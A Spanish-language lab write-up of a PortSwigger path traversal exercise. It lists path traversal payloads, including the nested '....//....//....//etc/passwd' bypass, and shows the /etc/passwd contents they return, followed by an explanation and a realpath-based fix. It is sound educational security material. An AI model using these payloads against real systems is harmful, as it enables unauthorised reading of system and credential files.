---
title: "Lab: File path traversal, traversal sequences stripped non-recursively"
date: 2026-05-17
category: "Path Traversal"
order: 4
tags: ["web-security-academy", "path-traversal", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/path-traversal-lab-stripped-non-recursively.html
---

## Descripción de la vulnerabilidad

Esta es otra variante de Path Traversal donde la app tiene una defensa más elaborada que el lab anterior: **elimina las secuencias `../` del input**. Sin embargo, lo hace de forma **no recursiva** — una sola pasada. Eso permite construir un payload que, al ser "limpiado" por el filtro, deja como resultado otro `../` válido.

---

## Reconocimiento

Mismo patrón de siempre — parámetro `filename` que interactúa con el sistema de archivos:

```
GET /image?filename=18.jpg
```

---

## Pruebas realizadas

### Intento 1 — Traversal clásico ❌

```
filename=../
filename=../../etc/passwd
filename=../../../../etc/passwd
```

**Respuesta:** `400 No such file`. La app detecta y bloquea `../` en cualquier cantidad.

### Intento 2 — Ruta absoluta ❌

```
filename=/etc/passwd
```

**Respuesta:** `400 No such file`. A diferencia del lab anterior, aquí la ruta absoluta también está bloqueada — el filtro es más completo.

### Intento 3 — URL encoding ❌

```
filename=..%2F
filename=%2Fetc%2Fpasswd
```

**Respuesta:** `400 No such file`. El filtro también cubre variantes con URL encoding.

### Intento 4 — Null byte ❌

```
filename=../../../etc/passwd%00.png
```

**Respuesta:** `400 No such file`. Bloqueado igual — el filtro actúa antes de que el null byte tenga efecto.

### Intento 5 — Secuencia anidada ✅

```
filename=....//....//....//etc/passwd
```

**Respuesta:** `200 OK` — contenido de `/etc/passwd`.

---

## Explotación exitosa

El payload `....//....//....//etc/passwd` devolvió el contenido completo de `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
...
```

---

## ¿Por qué funcionó `....//`?

El filtro hace algo como esto internamente:

```python
filename = filename.replace("../", "")
```

Una sola pasada — encuentra `../`, lo elimina, y no vuelve a revisar el resultado.

Si mandás `....//`, el filtro lo procesa así: encuentra `../` en el medio (los dos puntos centrales + la barra) y lo elimina, dejando `../` como resultado. Como no repite el proceso, ese `../` resultante pasa limpio y el SO lo resuelve normal.

El payload completo `....//....//....//etc/passwd` después del filtro queda:

```
../../../etc/passwd
```

Que es exactamente el traversal clásico — solo que disfrazado para sobrevivir el filtro.

---

## ¿Por qué no funcionaron los otros bypasses de labs anteriores?

Este lab tiene un filtro más completo que los anteriores:

<table>
<tr><td>Payload</td><td>Lab 1 (simple)</td><td>Lab 2 (absolute path)</td><td>Lab 3 (este)</td></tr>
<tr><td><code>../../../etc/passwd</code></td><td>Sí</td><td>No</td><td>No</td></tr>
<tr><td><code>/etc/passwd</code></td><td>No</td><td>Sí</td><td>No</td></tr>
<tr><td><code>%2Fetc%2Fpasswd</code></td><td>No</td><td>Sí</td><td>No</td></tr>
<tr><td><code>....//....//....//etc/passwd</code></td><td>Sí</td><td>Sí</td><td>Sí</td></tr>
</table>

Cada lab agrega una capa de defensa distinta. La secuencia anidada `....//` funciona en todos porque ataca el mecanismo de eliminación del filtro, no intenta evadirlo con encoding o rutas alternativas.

---

## ¿Qué significa "non-recursively"?

Es la diferencia entre un filtro débil y uno fuerte:

**Filtro no recursivo (este lab — vulnerable):**

```python
filename = filename.replace("../", "")  # una sola pasada
```

**Filtro recursivo (seguro contra este bypass):**

```python
while "../" in filename:
    filename = filename.replace("../", "")  # repite hasta que no quede ningún ../
```

Con el filtro recursivo, `....//` quedaría reducido a nada después de múltiples pasadas — el bypass no funcionaría. Sin embargo, incluso un filtro recursivo no es la solución correcta porque sigue siendo una blacklist — siempre hay variantes que pueden evadirla.

---

## ¿Cómo se previene correctamente?

Igual que siempre — no con blacklists sino validando la ruta resuelta:

```python
import os

BASE = "/var/www/images"
filename = request.params["filename"]

full_path = os.path.realpath(os.path.join(BASE, filename))

if not full_path.startswith(BASE):
    return 400, "Acceso denegado"

open(full_path)
```

Con `realpath()` el SO resuelve primero toda la ruta — incluyendo `....//` — y luego se verifica que el resultado esté dentro del directorio base. No importa cuántas capas de ofuscación tenga el payload, la ruta resuelta siempre será la misma.

---

## Lecciones aprendidas

- "Stripped non-recursively" significa que el filtro elimina `../` una sola vez sin revisar el resultado.
- `....//` es el bypass clásico para este tipo de filtro — al eliminar `../` del centro queda otro `../`.
- Cada lab agrega una capa distinta de defensa — lo que funcionó en el lab anterior puede no funcionar aquí.
- Una blacklist nunca es suficiente, incluso si es recursiva, porque los atacantes tienen más variantes.
- El bypass `....//` funciona contra prácticamente cualquier filtro basado en blacklist de `../`.
- La única defensa sólida es resolver la ruta completa con `realpath()` y validar el resultado.

---

## Referencia

Lab oficial: [PortSwigger — File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal)

**Estado:** Solved
